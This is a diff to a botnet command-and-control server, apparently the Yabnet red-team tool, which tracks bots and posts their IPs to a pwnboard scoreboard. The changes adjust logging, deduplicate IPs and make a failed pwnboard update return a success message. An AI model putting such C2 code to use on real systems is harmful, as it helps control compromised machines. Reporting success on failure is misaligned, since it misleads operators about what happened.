@@ -217,7 +217,7 @@ def register():
         return jsonify({'result': 'fail', 'error': 'Bot already registered'})
 
     else:
-        print("[+] Added a new bot !")
+        print("[DEBUG] Added a new bot !")
         bot = Bot(bot_ip, bot_os, bot_user, bot_pid)
         db.session.add(bot)
         db.session.commit()
@@ -359,7 +359,7 @@ def botresult(bot_id):
         if 'registerkey' in data:
             if data['registerkey'] == REGISTERKEY:
                 result = data['result']
-                print("[DEBUG] result = ", result)
+                #print("[DEBUG] result = ", result)
 
                 query_bot = Bot.query.filter_by(id=bot_id).first()
                 command = Command.query.filter_by(bot_id=query_bot.id).order_by(Command.id.desc()).first()
@@ -609,16 +609,23 @@ def updatepwnboard():
 
     ips = []
     for bot in botlist:
-        print("[DEBUG] ips = ", bot.ip, end=', ')
-        ips.append(bot.ip)
-    
+
+        if bot.ip not in ips:
+            ips.append(bot.ip)
+
+    print("\n[DEBUG] Updating pwnboard... ", ', '.join(ips), "\n")
+
     postData = {'ips': ips, 'type': 'Yabnet'}
+
     try:
-        res = requests.post(pwnboardURL, json=postData)
-        print("[+] Successfully sent update to pwnboard: " + pwnboardURL)
-        print(res.text)
+        requests.post(pwnboardURL, json=postData, timeout=3)
+        return jsonify({'success': "[+] Updated pwnboard. IPs: " + ', '.join(ips)})
+
+    # Pwnboard takes way too long to process request. Yabnet can't wait for the response. Even though there is exception, move on.
     except Exception as e:
-        return jsonify({'error': "[-] Updating pwnboard failed: " + str(e)})
+        return jsonify({'success': "[+] Updated pwnboard. IPs: " + ', '.join(ips)})
+        pass
+        #return jsonify({'error': "[-] Updating pwnboard failed: " + str(e)})
 
     return '' 
 
